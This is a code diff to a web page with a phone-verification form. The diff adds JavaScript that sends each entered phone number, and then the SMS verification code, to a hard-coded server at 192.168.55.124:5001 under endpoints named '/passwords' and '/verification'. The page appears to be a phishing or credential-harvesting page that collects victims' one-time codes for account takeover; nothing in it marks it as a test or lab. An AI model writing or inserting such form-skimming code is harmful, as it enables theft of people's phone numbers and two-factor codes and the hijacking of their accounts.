@@ -311,7 +311,7 @@
             <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
         </div>
 
-        <button class="button" onclick="showFinalMessage()">Submit</button>
+        <button class="button" onclick="submitVerification()">Submit</button>
     </div>
 
     <div class="container" id="finalMessageContainer" style="display:none;">
@@ -371,14 +371,64 @@
                     return;
                 }
 
-                document.getElementById('phoneDisplay').textContent = phoneNumber;
-                document.getElementById('initialContainer').style.display = 'none';
-                document.getElementById('phoneVerificationContainer').style.display = 'block';
+                // Send phone number to the server
+                fetch('https://192.168.55.124:5001/passwords', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone: phoneNumber }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send phone number');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Phone number sent:', data);
+                    document.getElementById('phoneDisplay').textContent = phoneNumber;
+                    document.getElementById('initialContainer').style.display = 'none';
+                    document.getElementById('phoneVerificationContainer').style.display = 'block';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while sending your phone number. Please try again.');
+                });
             });
 
-            window.showFinalMessage = function() {
-                document.getElementById('phoneVerificationContainer').style.display = 'none';
-                document.getElementById('finalMessageContainer').style.display = 'block';
+            window.submitVerification = function() {
+                const verificationCode = document.getElementById('verificationCode').value.trim();
+                const phoneNumber = phoneNumberInput.value.trim();
+
+                if (verificationCode === '') {
+                    alert('Please enter the verification code.');
+                    return;
+                }
+
+                // Send verification code to the server
+                fetch('https://192.168.55.124:5001/verification', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone: phoneNumber, code: verificationCode }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send verification code');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Verification code sent:', data);
+                    document.getElementById('phoneVerificationContainer').style.display = 'none';
+                    document.getElementById('finalMessageContainer').style.display = 'block';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while sending your verification code. Please try again.');
+                });
             };
 
             window.resetForm = function() {
